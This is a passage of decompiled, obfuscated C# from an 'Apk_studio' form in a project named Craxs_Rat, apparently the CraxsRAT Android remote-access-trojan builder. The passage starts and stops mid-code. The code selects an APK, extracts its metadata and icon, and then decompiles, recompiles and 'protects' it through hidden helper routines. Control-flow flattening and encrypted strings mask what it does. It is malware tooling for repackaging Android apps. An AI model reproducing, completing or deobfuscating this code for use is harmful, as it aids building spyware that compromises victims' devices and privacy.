        switch ((num3 = (uint) ~~(~((716759646 + 1618304604) * -1042481989 - -1867497157 * (1118801286 - 1011038039)) - num2 * 1778725311)) % 17U)
        {
          case 0:
            this.BackgroundWorker1.RunWorkerAsync();
            num1 = (int) num3 * 472912045 ^ -236589195;
            continue;
          case 1:
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ((Apk_studio._Closure\u0024__124\u002D1) this).TargetAPKNAME = Path.GetFileNameWithoutExtension(((Apk_studio._Closure\u0024__124\u002D0) this).TargetAPKPATH);
            num1 = (int) num3 * -1485758570 ^ 45669549;
            continue;
          case 2:
            this.titlespanel.Visible = true;
            int num4 = this.BackgroundWorker1.IsBusy ? -585972746 : (num4 = -2099979859);
            num1 = num4 ^ (int) num3 * 1573117771;
            continue;
          case 3:
            openFileDialog.RestoreDirectory = true;
            num1 = (int) num3 * 828904472 ^ 365599719;
            continue;
          case 4:
            goto label_1;
          case 5:
            int num5 = openFileDialog.ShowDialog() == DialogResult.OK ? -1379751689 : (num5 = -69610529);
            num1 = num5 ^ (int) num3 * 280400972;
            continue;
          case 6:
            this.titlespanel.Enabled = true;
            num1 = -1343113239;
            continue;
          case 7:
            // ISSUE: reference to a compiler-generated field
            ((Apk_studio._Closure\u0024__125\u002D0) this).craxsStudioPath = directoryName + EXGuarder.\u0033B0D5D76;
            // ISSUE: reference to a compiler-generated field
            int num6 = Directory.Exists(((Apk_studio._Closure\u0024__125\u002D0) this).craxsStudioPath) ? 1564263572 : (num6 = -536782313);
            num1 = num6 ^ (int) num3 * 362561853;
            continue;
          case 8:
            this.TargetApktext.Text = openFileDialog.FileName;
            num1 = -649906979;
            continue;
          case 9:
            // ISSUE: reference to a compiler-generated field
            Directory.CreateDirectory(((Apk_studio._Closure\u0024__125\u002D0) this).craxsStudioPath);
            num1 = (int) num3 * 2089744551 ^ 2022242313;
            continue;
          case 10:
            // ISSUE: reference to a compiler-generated field
            directoryName = Path.GetDirectoryName(((Apk_studio._Closure\u0024__124\u002D0) this).TargetAPKPATH);
            num1 = (int) num3 * -1304649947 ^ -1461071066;
            continue;
          case 11:
            goto label_10;
          case 12:
            this.TargetApktext.Text = EXGuarder.\u003580E0604;
            num1 = (int) num3 * -1721886522 ^ 1094045557;
            continue;
          case 13:
            CraxsAlert.Showinformation(EXGuarder.\u00345353C24);
            num1 = (int) num3 * -601246735 ^ -1237931269;
            continue;
          case 14:
            // ISSUE: reference to a compiler-generated field
            ((Apk_studio._Closure\u0024__124\u002D0) this).TargetAPKPATH = openFileDialog.FileName;
            num1 = (int) num3 * -1056458031 ^ -1004527924;
            continue;
          case 15:
            goto label_3;
          case 16:
            openFileDialog.Filter = EXGuarder.\u0033A310B3A;
            num1 = (int) num3 * 1190358341 ^ -391824712;
            continue;
          default:
            goto label_19;
        }
      }
label_3:
      return;
label_19:
      return;
label_10:
      openFileDialog = new OpenFileDialog();
      openFileDialog.Title = EXGuarder.\u00369010707;
      num1 = 307947188;
      goto label_2;
    }

    private void BackgroundWorker1_DoWork(object sender, DoWorkEventArgs e)
    {
      // ISSUE: reference to a compiler-generated field
      if (string.IsNullOrEmpty(((Apk_studio._Closure\u0024__124\u002D0) this).TargetAPKPATH))
        return;
label_1:
      int num1 = -1355844512;
      // ISSUE: variable of a compiler-generated type
      Apk_studio._Closure\u0024__116\u002D0 TargetObject;
      string sdkNumber1;
      MatchCollection matchCollection;
      string sdkNumber2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (-(~(num1 - (-466407068 * 1947051409 ^ 1232201864 + -70187479 + (-1071347595 - (1151344846 - -2020199791)) - ~--2032700273) - ((1163951006 - 965060900 ^ 1019074668 * 79009321) + (-22920622 - (-774275314 ^ -830114652)) - (-(185078079 + 327598918) + ~(-99268941 ^ 845218405)))) ^ (-318476630 ^ 235095837) - (1739213597 - 432809516)) ^ -1080515914)) % 15U)
        {
          case 0:
            goto label_1;
          case 2:
            // ISSUE: reference to a compiler-generated field
            sdkNumber2 = Conversions.ToString(Codes.RegexMatcher(EXGuarder.\u0036D344C4E, ((Apk_studio._Closure\u0024__125\u002D0) this).APKINFO));
            num1 = (int) num2 * -484729093 ^ -1266824466;
            continue;
          case 3:
            // ISSUE: reference to a compiler-generated field
            ((Apkinstaller) TargetObject).\u0024VB\u0024Local_PackageName = Conversions.ToString(Codes.RegexMatcher(EXGuarder.\u003731C0960, ((Apk_studio._Closure\u0024__125\u002D0) this).APKINFO));
            num1 = (int) num2 * -1723726789 ^ -861337560;
            continue;
          case 4:
            ((Apkinstaller) TargetObject).\u0024VB\u0024Local_androidto = Codes.GetAndroidVersionName(sdkNumber2);
            num1 = (int) num2 * 1857644035 ^ 2112868289;
            continue;
          case 5:
            // ISSUE: reference to a compiler-generated field
            ((Apkinstaller) TargetObject).\u0024VB\u0024Local_Vername = Conversions.ToString(Codes.RegexMatcher(EXGuarder.\u00345057868, ((Apk_studio._Closure\u0024__125\u002D0) this).APKINFO));
            num1 = (int) num2 * -1214648160 ^ -122125473;
            continue;
          case 6:
            ((Apkinstaller) TargetObject).\u0024VB\u0024Local_androidfrom = Codes.GetAndroidVersionName(sdkNumber1);
            num1 = (int) num2 * -1401495080 ^ -1526558256;
            continue;
          case 7:
            if (string.IsNullOrEmpty(((Apkinstaller) TargetObject).\u0024VB\u0024Local_appname))
            {
              num1 = (int) num2 * -1954330380 ^ -2089672639;
              continue;
            }
            goto label_43;
          case 8:
            // ISSUE: reference to a compiler-generated field
            ((Apkinstaller) TargetObject).\u0024VB\u0024Local_appname = Codes.ExtractName(((Apk_studio._Closure\u0024__124\u002D0) this).TargetAPKPATH);
            num1 = -2013348680;
            continue;
          case 9:
            // ISSUE: reference to a compiler-generated field
            matchCollection = Regex.Matches(((Apk_studio._Closure\u0024__125\u002D0) this).APKINFO, EXGuarder.\u00319066509);
            num1 = (int) num2 * -1164376625 ^ 973745626;
            continue;
          case 10:
            this.apkicon.Image = (Image) null;
            num1 = (int) num2 * -1085322131 ^ 86639716;
            continue;
          case 11:
            // ISSUE: reference to a compiler-generated field
            sdkNumber1 = Conversions.ToString(Codes.RegexMatcher(EXGuarder.\u00375077437, ((Apk_studio._Closure\u0024__125\u002D0) this).APKINFO));
            num1 = (int) num2 * -378841491 ^ -810915266;
            continue;
          case 12:
            // ISSUE: object of a compiler-generated type is created
            TargetObject = (Apk_studio._Closure\u0024__116\u002D0) new Apk_studio._Closure\u0024__114\u002D0(TargetObject);
            ((Apkinstaller) TargetObject).\u0024VB\u0024Me = this;
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ((Apk_studio._Closure\u0024__125\u002D0) this).APKINFO = Codes.ProcessStartWithOutput(Codes.RealPath(EXGuarder.\u0036B25493A), EXGuarder.\u0032B69040B + ((Apk_studio._Closure\u0024__124\u002D0) this).TargetAPKPATH + EXGuarder.\u0036B0F0351);
            int num3 = this.apkicon.Image == null ? 2089840927 : (num3 = 1124111719);
            num1 = num3 ^ (int) num2 * 1023298731;
            continue;
          case 13:
            // ISSUE: reference to a compiler-generated field
            ((Apkinstaller) TargetObject).\u0024VB\u0024Local_Vercode = Conversions.ToString(Codes.RegexMatcher(EXGuarder.\u0031A1D584E, ((Apk_studio._Closure\u0024__125\u002D0) this).APKINFO));
            num1 = (int) num2 * 1140552097 ^ 1523277;
            continue;
          case 14:
            this.apkicon.Image.Dispose();
            num1 = (int) num2 * -279092242 ^ -690028703;
            continue;
          default:
            goto label_17;
        }
      }
label_17:
      IEnumerator enumerator;
      if (matchCollection.Count > 0)
      {
        try
        {
          enumerator = matchCollection.GetEnumerator();
label_25:
          int num4 = enumerator.MoveNext() ? 1591199997 : (num4 = 2025841316);
          string str;
          Match current;
          while (true)
          {
            uint num5;
            switch ((num5 = (uint) (-(~(num4 - (-466407068 * 1947051409 ^ 1232201864 + -70187479 + (-1071347595 - (1151344846 - -2020199791)) - ~--2032700273) - ((1163951006 - 965060900 ^ 1019074668 * 79009321) + (-22920622 - (-774275314 ^ -830114652)) - (-(185078079 + 327598918) + ~(-99268941 ^ 845218405)))) ^ (-318476630 ^ 235095837) - (1739213597 - 432809516)) ^ -1080515914)) % 7U)
            {
              case 0:
                num4 = 1591199997;
                continue;
              case 2:
                current = (Match) enumerator.Current;
                num4 = 1484581597;
                continue;
              case 3:
                ((Apkinstaller) TargetObject).\u0024VB\u0024Local_appname = str;
                num4 = (int) num5 * -592422385 ^ 1384251936;
                continue;
              case 4:
                str = current.Groups[1].Value;
                num4 = (int) num5 * 1521417086 ^ 55026799;
                continue;
              case 5:
                goto label_25;
              case 6:
                Console.WriteLine(EXGuarder.\u00325284D5F + str);
                num4 = (int) num5 * -1370463995 ^ 1085551655;
                continue;
              default:
                goto label_43;
            }
          }
        }
        finally
        {
          if (enumerator is IDisposable)
          {
label_27:
            int num6 = 944233897;
            while (true)
            {
              uint num7;
              switch ((num7 = (uint) (-(~(num6 - (-466407068 * 1947051409 ^ 1232201864 + -70187479 + (-1071347595 - (1151344846 - -2020199791)) - ~--2032700273) - ((1163951006 - 965060900 ^ 1019074668 * 79009321) + (-22920622 - (-774275314 ^ -830114652)) - (-(185078079 + 327598918) + ~(-99268941 ^ 845218405)))) ^ (-318476630 ^ 235095837) - (1739213597 - 432809516)) ^ -1080515914)) % 3U)
              {
                case 1:
                  (enumerator as IDisposable).Dispose();
                  num6 = (int) num7 * 1229579324 ^ 548597042;
                  continue;
                case 2:
                  goto label_27;
                default:
                  goto label_31;
              }
            }
          }
label_31:;
        }
      }
      else
        ((Apkinstaller) TargetObject).\u0024VB\u0024Local_appname = EXGuarder.\u00372153B0C;
label_33:
      int num8 = -1427810127;
label_34:
      string path;
      string str1;
      string directoryName;
      string[] pngs;
      string str2;
      int index;
      string language;
      while (true)
      {
        uint num9;
        switch ((num9 = (uint) (-(~(num8 - (-466407068 * 1947051409 ^ 1232201864 + -70187479 + (-1071347595 - (1151344846 - -2020199791)) - ~--2032700273) - ((1163951006 - 965060900 ^ 1019074668 * 79009321) + (-22920622 - (-774275314 ^ -830114652)) - (-(185078079 + 327598918) + ~(-99268941 ^ 845218405)))) ^ (-318476630 ^ 235095837) - (1739213597 - 432809516)) ^ -1080515914)) % 21U)
        {
          case 0:
            int num10 = Operators.CompareString(language, EXGuarder.\u00367294653, false) == 0 ? 1594390943 : (num10 = -2130487442);
            num8 = num10 ^ (int) num9 * -1309557250;
            continue;
          case 1:
            checked { ++index; }
            num8 = (int) num9 * 39781038 ^ -517482691;
            continue;
          case 2:
            // ISSUE: method pointer
            this.Invoke((Delegate) new EXGuarder((object) TargetObject, __methodptr(_Lambda\u0024__1)));
            num8 = 1692600310;
            continue;
          case 3:
            // ISSUE: method pointer
            this.Invoke((Delegate) new EXGuarder((object) TargetObject, __methodptr(_Lambda\u0024__2)));
            num8 = (int) num9 * 1353681792 ^ 1393762038;
            continue;
          case 4:
            path = path.Replace(EXGuarder.\u00363175A39, EXGuarder.\u003230A6F1D);
            num8 = (int) num9 * 1735193289 ^ 306071245;
            continue;
          case 5:
            // ISSUE: reference to a compiler-generated field
            path = Conversions.ToString(Codes.RegexMatcher(EXGuarder.\u003336A1962, ((Apk_studio._Closure\u0024__125\u002D0) this).APKINFO));
            num8 = 1081035294;
            continue;
          case 7:
            num8 = (int) num9 * 673357329 ^ 1780078774;
            continue;
          case 8:
            int num11 = Operators.CompareString(Path.GetExtension(path), EXGuarder.\u00363175A39, false) != 0 ? 679405825 : (num11 = 1614331672);
            num8 = num11 ^ (int) num9 * 1960698980;
            continue;
          case 9:
            // ISSUE: reference to a compiler-generated field
            Codes.ProcessStartWithOutput(Codes.RealPath(EXGuarder.\u00356260C57), EXGuarder.\u003493A6113 + ((Apk_studio._Closure\u0024__124\u002D0) this).TargetAPKPATH + EXGuarder.\u0033D761072 + path + EXGuarder.\u0034C48320E + directoryName + EXGuarder.\u003535A0F23);
            num8 = 2081656952;
            continue;
          case 10:
            pngs = Codes.pngs;
            num8 = (int) num9 * -622342359 ^ 1971739963;
            continue;
          case 11:
            num8 = (int) num9 * 1940313998 ^ -425824554;
            continue;
          case 12:
            // ISSUE: reference to a compiler-generated field
            Codes.ProcessStartWithOutput(Codes.RealPath(EXGuarder.\u00356260C57), EXGuarder.\u003493A6113 + ((Apk_studio._Closure\u0024__124\u002D0) this).TargetAPKPATH + EXGuarder.\u0033D761072 + str2 + EXGuarder.\u0034C48320E + directoryName + EXGuarder.\u003535A0F23);
            num8 = (int) num9 * 1109465033 ^ 944493650;
            continue;
          case 13:
            string newValue = pngs[index];
            str2 = path.Replace(EXGuarder.\u00360080B18, newValue).Replace(EXGuarder.\u003040F6C37, newValue);
            num8 = 1931031630;
            continue;
          case 14:
            int num12;
            num8 = num12 = index < pngs.Length ? -1468096722 : (num12 = 1045591737);
            continue;
          case 15:
            goto label_43;
          case 16:
            int num13 = Operators.CompareString(language, EXGuarder.\u003100B2C00, false) == 0 ? 832358914 : (num13 = 29563418);
            num8 = num13 ^ (int) num9 * -886369856;
            continue;
          case 17:
            goto label_33;
          case 18:
            // ISSUE: method pointer
            this.Invoke((Delegate) new EXGuarder((object) TargetObject, __methodptr(_Lambda\u0024__0)));
            num8 = 1692600310;
            continue;
          case 19:
            index = 0;
            num8 = (int) num9 * 1716042315 ^ 1868373513;
            continue;
          case 20:
            str1 = Codes.TempPathCache + ((Apkinstaller) TargetObject).\u0024VB\u0024Local_PackageName + EXGuarder.\u0031E4D1934 + path;
            directoryName = Path.GetDirectoryName(str1);
            int num14;
            num8 = num14 = !path.Contains(EXGuarder.\u0031706010F) ? 2126645084 : (num14 = -1959768647);
            continue;
          default:
            goto label_55;
        }
      }
label_55:
      // ISSUE: reference to a compiler-generated field
      Codes.ProcessStartWithOutput(Codes.RealPath(EXGuarder.\u00356260C57), EXGuarder.\u003493A6113 + ((Apk_studio._Closure\u0024__124\u002D0) this).TargetAPKPATH + EXGuarder.\u00344394567 + Codes.TempPathCache + ((Apkinstaller) TargetObject).\u0024VB\u0024Local_PackageName + EXGuarder.\u00370522A75);
      try
      {
        this.apkicon.Image = Image.FromFile(str1);
        return;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
label_58:
        int num15 = 972544445;
        while (true)
        {
          uint num16;
          switch ((num16 = (uint) (-(~(num15 - (-466407068 * 1947051409 ^ 1232201864 + -70187479 + (-1071347595 - (1151344846 - -2020199791)) - ~--2032700273) - ((1163951006 - 965060900 ^ 1019074668 * 79009321) + (-22920622 - (-774275314 ^ -830114652)) - (-(185078079 + 327598918) + ~(-99268941 ^ 845218405)))) ^ (-318476630 ^ 235095837) - (1739213597 - 432809516)) ^ -1080515914)) % 4U)
          {
            case 0:
              ProjectData.ClearProjectError();
              num15 = (int) num16 * 1693195495 ^ 2095576498;
              continue;
            case 1:
              this.apkicon.Image = (Image) Craxs_Rat.My.Resources.Resources.noicon;
              num15 = (int) num16 * -271309553 ^ -878772293;
              continue;
            case 2:
              goto label_35;
            case 3:
              goto label_58;
            default:
              goto label_29;
          }
        }
label_35:
        return;
label_29:
        return;
      }
label_43:
      language = RegistryHandler.Get_Language();
      num8 = 950205883;
      goto label_34;
    }

    private void Button1_Click(object sender, EventArgs e)
    {
      if (this.apkicon.Image != null)
      {
label_1:
        int num1 = -1566728037;
        string fileName;
        while (true)
        {
          int num2 = num1;
          uint num3;
          SaveFileDialog saveFileDialog;
          switch ((num3 = (uint) (-1746802238 - ~(--1030930217 - ~-521834181 - ~(-num2 + (-~1839781513 + -(-112590079 - 1730034060) - -(456468839 - 475027373 + ~-1209965494)))))) % 7U)
          {
            case 0:
              saveFileDialog.RestoreDirectory = true;
              num1 = (int) num3 * -1081946783 ^ -1670838683;
              continue;
            case 1:
              fileName = saveFileDialog.FileName;
              num1 = (int) num3 * -1467420913 ^ 211585234;
              continue;
            case 3:
              if (saveFileDialog.ShowDialog() == DialogResult.OK)
              {
                num1 = (int) num3 * -1866907377 ^ -2026851041;
                continue;
              }
              goto label_20;
            case 4:
              goto label_1;
            case 5:
              saveFileDialog = new SaveFileDialog();
              num1 = (int) num3 * -536481364 ^ 2096019788;
              continue;
            case 6:
              saveFileDialog.FileName = EXGuarder.\u0036E6C330C;
              saveFileDialog.Filter = EXGuarder.\u00363254213;
              num1 = (int) num3 * -189650044 ^ -1465564768;
              continue;
            default:
              goto label_10;
          }
        }
label_20:
        return;
label_10:
        Image image = this.apkicon.Image;
        Bitmap bitmap = new Bitmap(image.Width, image.Height, PixelFormat.Format32bppArgb);
        Graphics graphics = Graphics.FromImage((Image) bitmap);
        try
        {
          graphics.DrawImage(image, new Rectangle(0, 0, image.Width, image.Height));
        }
        finally
        {
          if (graphics != null)
          {
label_13:
            int num4 = -998071130;
            while (true)
            {
              int num5 = num4;
              uint num6;
              switch ((num6 = (uint) (-1746802238 - ~(--1030930217 - ~-521834181 - ~(-num5 + (-~1839781513 + -(-112590079 - 1730034060) - -(456468839 - 475027373 + ~-1209965494)))))) % 3U)
              {
                case 1:
                  graphics.Dispose();
                  num4 = (int) num6 * 467390648 ^ 2142690388;
                  continue;
                case 2:
                  goto label_13;
                default:
                  goto label_16;
              }
            }
          }
label_16:;
        }
        bitmap.Save(fileName, ImageFormat.Png);
        // ISSUE: reference to a compiler-generated method
        AsyncLock.VB\u0024StateMachine_2_LockAsync.ShowSucess(EXGuarder.\u00364586125);
      }
      else
      {
label_21:
        CraxsAlert.Showinformation(EXGuarder.\u0033E2E134F);
        int num7 = -957388758;
        while (true)
        {
          int num8 = num7;
          uint num9;
          switch ((num9 = (uint) (-1746802238 - ~(--1030930217 - ~-521834181 - ~(-num8 + (-~1839781513 + -(-112590079 - 1730034060) - -(456468839 - 475027373 + ~-1209965494)))))) % 3U)
          {
            case 0:
              num7 = 2109528326;
              continue;
            case 1:
              goto label_21;
            case 2:
              goto label_3;
            default:
              goto label_22;
          }
        }
label_3:
        return;
label_22:;
      }
    }

    private void Andtotext_Click(object sender, EventArgs e)
    {
      Label label = (Label) sender;
label_1:
      int num1 = -1469892317;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (-(-(num1 ^ 97875298 ^ (-923207099 ^ 1114859652 - 1343964973) + -(1407671142 ^ 987428252) ^ (~-1395751973 ^ 2093616093 ^ 2090314251) * 1157428629 - (1575596218 - 292544269 ^ -354540491) * -694459325) * 2014048701 - (1758604742 * 969605279 ^ -395758718 * 1028177439)) ^ 838764109)) % 3U)
        {
          case 0:
            goto label_1;
          case 2:
            Clipboard.SetText(label.Text);
            num1 = (int) num2 * -973108976 ^ 1107855699;
            continue;
          default:
            goto label_4;
        }
      }
label_4:
      // ISSUE: reference to a compiler-generated method
      AsyncLock.VB\u0024StateMachine_2_LockAsync.ShowSucess(EXGuarder.\u0031F4A2A10 + label.Text);
    }

    private void Button2_Click(object sender, EventArgs e)
    {
      // ISSUE: reference to a compiler-generated field
      if (!string.IsNullOrEmpty(((Apk_studio._Closure\u0024__124\u002D0) this).TargetAPKPATH))
        goto label_5;
label_1:
      int num1 = -259760546;
label_2:
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) -(-num1 + ((-(-90701479 - 1925983239) ^ 1006226257 * (-959800161 ^ -560244004)) - (-1603228340 - 1769771630 - --1970679494 ^ 952850628)) - -504299511)) % 11U)
        {
          case 0:
            this.deworker.RunWorkerAsync();
            num1 = (int) num2 * -1094121331 ^ -1335739811;
            continue;
          case 1:
            CraxsAlert.Showinformation(EXGuarder.\u00327156805);
            num1 = (int) num2 * -246563493 ^ 1409347085;
            continue;
          case 2:
            goto label_3;
          case 3:
            this.log(EXGuarder.\u003255E0E4C);
            num1 = 914001575;
            continue;
          case 4:
            goto label_1;
          case 5:
            num1 = (int) num2 * 1123241614 ^ -93246058;
            continue;
          case 6:
            num1 = (int) num2 * 670596855 ^ -1472395593;
            continue;
          case 7:
            CraxsAlert.Showinformation(EXGuarder.\u0036A710814);
            num1 = (int) num2 * -1173024251 ^ 2041143881;
            continue;
          case 8:
            int num3;
            num1 = num3 = !this.deworker.IsBusy ? 160226523 : (num3 = -287844157);
            continue;
          case 9:
            int num4 = !Codes.MyMsgBox(EXGuarder.\u00318102A62, EXGuarder.\u00316455B07, true, Craxs_Rat.My.Resources.Resources.information48px) ? -2108703518 : (num4 = 978593776);
            num1 = num4 ^ (int) num2 * 1899377852;
            continue;
          case 10:
            goto label_5;
          default:
            goto label_13;
        }
      }
label_3:
      return;
label_13:
      return;
label_5:
      // ISSUE: reference to a compiler-generated field
      num1 = !Directory.Exists(((Apk_studio._Closure\u0024__124\u002D1) this).TargetWorkPATH) ? 1301116652 : (num1 = -818244063);
      goto label_2;
    }

    private void Deworker_DoWork(object sender, DoWorkEventArgs e)
    {
      // ISSUE: object of a compiler-generated type is created
      // ISSUE: variable of a compiler-generated type
      Apk_studio._Closure\u0024__120\u002D0 TargetObject = (Apk_studio._Closure\u0024__120\u002D0) new Apk_studio._Closure\u0024__116\u002D0();
      ((Auto_Clicker) TargetObject).\u0024VB\u0024Me = this;
label_1:
      int num1 = -896802632;
      string directoryName;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (~((num1 ^ -1578930433 * ~~1989925139 - -(-179768703 * -1910586220 + (225762442 ^ 1259259847)) + (-(2112382648 - 80414960) + (-235298123 ^ --1804739919) - (975648247 - (~-331484543 + 1384979897 * 557805003))) ^ -(-619060553 - 1603987571 + --68746584) ^ -206053560 - 1278663623 + 1009150195 ^ 258326585 ^ -(1296301386 - -791324002 + 1570437875)) - --1986930240) * 1259878017)) % 5U)
        {
          case 0:
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ((Apk_studio._Closure\u0024__124\u002D1) this).TargetWorkPATH = directoryName + EXGuarder.\u0036F110E33 + ((Apk_studio._Closure\u0024__124\u002D1) this).TargetAPKNAME;
            num1 = (int) num2 * 482155730 ^ 1681581915;
            continue;
          case 1:
            // ISSUE: reference to a compiler-generated field
            directoryName = Path.GetDirectoryName(((Apk_studio._Closure\u0024__124\u002D0) this).TargetAPKPATH);
            num1 = (int) num2 * -997072588 ^ 1780614521;
            continue;
          case 2:
            goto label_3;
          case 3:
            goto label_1;
          case 4:
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ((Auto_Clicker) TargetObject).\u0024VB\u0024Local_result = Codes.ExecuteDecompile(((Apk_studio._Closure\u0024__124\u002D0) this).TargetAPKPATH, ((Apk_studio._Closure\u0024__124\u002D1) this).TargetWorkPATH);
            // ISSUE: method pointer
            this.Invoke((Delegate) new EXGuarder((object) TargetObject, __methodptr(_Lambda\u0024__0)));
            num1 = (int) num2 * 232675440 ^ -87076421;
            continue;
          default:
            goto label_7;
        }
      }
label_3:
      return;
label_7:;
    }

    private void Button5_Click(object sender, EventArgs e)
    {
      // ISSUE: reference to a compiler-generated field
      if (!string.IsNullOrEmpty(((Apk_studio._Closure\u0024__124\u002D0) this).TargetAPKPATH))
        goto label_8;
label_1:
      int num1 = 788025718;
label_2:
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) ((~(num1 - -217790553 * ((~(-385571159 - 1649200693) + (-1856047953 - 381557687 - (-545545886 ^ 1115073773))) * 1940426105) - (2011054295 * (-1721225254 ^ 300877256) ^ (-322277804 ^ -1525123970) * -1842524641 ^ (-610933084 ^ 1456761325) * -520233453 + ~(567167396 - 1355011766))) - (105846159 - 2110686588 ^ -576439810 ^ 408360636)) * 1436534911)) % 7U)
        {
          case 0:
            goto label_1;
          case 1:
            CraxsAlert.Showinformation(EXGuarder.\u0033146280E);
            num1 = (int) num2 * 370170875 ^ -1783746403;
            continue;
          case 2:
            num1 = (int) num2 * 190693540 ^ -1974037439;
            continue;
          case 3:
            CraxsAlert.Showinformation(EXGuarder.\u003202C103C);
            num1 = (int) num2 * -1293388831 ^ 642433122;
            continue;
          case 4:
            goto label_3;
          case 5:
            goto label_8;
          case 6:
            this.protectworker.RunWorkerAsync();
            num1 = -440545283;
            continue;
          default:
            goto label_9;
        }
      }
label_3:
      return;
label_9:
      return;
label_8:
      num1 = !this.protectworker.IsBusy ? 594248599 : (num1 = -129499923);
      goto label_2;
    }

    private void Protectworker_DoWork(object sender, DoWorkEventArgs e)
    {
      // ISSUE: object of a compiler-generated type is created
      // ISSUE: variable of a compiler-generated type
      Apk_studio._Closure\u0024__122\u002D0 TargetObject = (Apk_studio._Closure\u0024__122\u002D0) new Apk_studio._Closure\u0024__120\u002D0();
label_1:
      int num1 = -1905442259;
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) (~~(--2100302518 * 1087816943 - (~((-899685751 * 1079508071 - 1001626029) * 2025593833 * 1276047295) - num2)) ^ -2115978026 ^ 1970976002)) % 5U)
        {
          case 0:
            // ISSUE: reference to a compiler-generated field
            ((Auto_Clicker) TargetObject).\u0024VB\u0024Local_result = Codes.Excuteapkeditor_pro(((Apk_studio._Closure\u0024__124\u002D0) this).TargetAPKPATH);
            num1 = (int) num3 * 1770784621 ^ 1357738822;
            continue;
          case 1:
            goto label_3;
          case 2:
            goto label_1;
          case 3:
            ((Auto_Clicker) TargetObject).\u0024VB\u0024Me = this;
            num1 = (int) num3 * 1368437773 ^ 234458046;
            continue;
          case 4:
            // ISSUE: method pointer
            this.Invoke((Delegate) new EXGuarder((object) TargetObject, __methodptr(_Lambda\u0024__0)));
            num1 = (int) num3 * -1735641944 ^ 689681841;
            continue;
          default:
            goto label_7;
        }
      }
label_3:
      return;
label_7:;
    }

    private void Button4_Click(object sender, EventArgs e)
    {
      // ISSUE: reference to a compiler-generated field
      if (!string.IsNullOrEmpty(((Apk_studio._Closure\u0024__124\u002D0) this).TargetAPKPATH))
        goto label_4;
label_1:
      int num1 = -1755887316;
label_2:
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) -~~(~(num1 ^ ~(-164534748 - 1433330283 + -713637414 * -356065937) - (~742629966 * 658133375 - -(1626811880 - -706279299)) ^ -1077654454 - 1495523772 + (1093036148 - 759926654) + ((1201695574 ^ 1408639118) + -652452699 * -1941586572) ^ 698453085) - ~(-1136671307 ^ 1010399977 - 588740231))) % 10U)
        {
          case 0:
            CraxsAlert.Showinformation(EXGuarder.\u0030D25720F);
            num1 = (int) num2 * 1999950040 ^ -1464468866;
            continue;
          case 1:
            this.COworker.RunWorkerAsync();
            num1 = -1881306114;
            continue;
          case 2:
            CraxsAlert.Showinformation(EXGuarder.\u0030906042E);
            num1 = (int) num2 * 1811186870 ^ 2068341668;
            continue;
          case 3:
            int num3;
            num1 = num3 = !this.COworker.IsBusy ? -1629710181 : (num3 = 919962524);
            continue;
          case 4:
            goto label_3;
          case 5:
            goto label_4;
          case 6:
            CraxsAlert.Showinformation(EXGuarder.\u0031A42586D);
            num1 = (int) num2 * -1507573063 ^ 1955548553;
            continue;
          case 7:
            goto label_1;
          case 8:
            num1 = (int) num2 * 687519696 ^ 1206842174;
            continue;
          case 9:
            num1 = (int) num2 * -1747561478 ^ -425914976;
            continue;
          default:
            goto label_12;
        }
      }
label_3:
      return;
label_12:
      return;
label_4:
      // ISSUE: reference to a compiler-generated field
      num1 = !string.IsNullOrEmpty(((Apk_studio._Closure\u0024__124\u002D1) this).TargetWorkPATH) ? -2010846437 : (num1 = 1595041586);
      goto label_2;
    }

    private void COworker_DoWork(object sender, DoWorkEventArgs e)
    {
      // ISSUE: object of a compiler-generated type is created
      // ISSUE: variable of a compiler-generated type
      Apk_studio._Closure\u0024__124\u002D0 TargetObject1 = (Apk_studio._Closure\u0024__124\u002D0) new Apk_studio._Closure\u0024__122\u002D0();
label_1:
      int num1 = 1759428465;
      // ISSUE: variable of a compiler-generated type
      Apk_studio._Closure\u0024__124\u002D1 TargetObject2;
      string fileName;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) --~~(num1 * -1032804703 ^ -(((-383000711 ^ 1636800002) + 491687043 * 1817174810) * 418962199))) % 11U)
        {
          case 0:
            // ISSUE: reference to a compiler-generated field
            ((Auto_Clicker) TargetObject1).\u0024VB\u0024Local_saveDialog.FileName = ((Apk_studio._Closure\u0024__124\u002D1) this).TargetAPKNAME + EXGuarder.\u0035C750822;
            num1 = (int) num2 * -1845749038 ^ -531353055;
            continue;
          case 1:
            ((Auto_Clicker) TargetObject1).\u0024VB\u0024Local_saveDialog.Filter = EXGuarder.\u003724A6774;
            ((Auto_Clicker) TargetObject1).\u0024VB\u0024Local_saveDialog.RestoreDirectory = true;
            // ISSUE: method pointer
            this.Invoke((Delegate) new EXGuarder((object) TargetObject1, __methodptr(_Lambda\u0024__0)));
            num1 = (int) num2 * 55224403 ^ -1531346064;
            continue;
          case 2:
            // ISSUE: method pointer
            this.Invoke((Delegate) new EXGuarder((object) TargetObject2, __methodptr(_Lambda\u0024__1)));
            num1 = (int) num2 * -2018154466 ^ 1505730857;
            continue;
          case 3:
            int num3 = ((Auto_Clicker) TargetObject1).\u0024VB\u0024Local_dialogResult != DialogResult.OK ? -1830823869 : (num3 = -392234966);
            num1 = num3 ^ (int) num2 * -1634035728;
            continue;
          case 4:
            ((Auto_Clicker) TargetObject1).\u0024VB\u0024Me = this;
            ((Auto_Clicker) TargetObject1).\u0024VB\u0024Local_saveDialog = new SaveFileDialog();
            num1 = (int) num2 * -209504078 ^ -592765127;
            continue;
          case 5:
            // ISSUE: object of a compiler-generated type is created
            TargetObject2 = (Apk_studio._Closure\u0024__124\u002D1) new Apk_studio._Closure\u0024__124\u002D0();
            num1 = (int) num2 * 183357212 ^ 764148845;
            continue;
          case 6:
            // ISSUE: reference to a compiler-generated field
            ((Auto_Clicker) TargetObject2).\u0024VB\u0024Local_result = Codes.ExecuteCompile(((Apk_studio._Closure\u0024__124\u002D1) this).TargetWorkPATH, fileName);
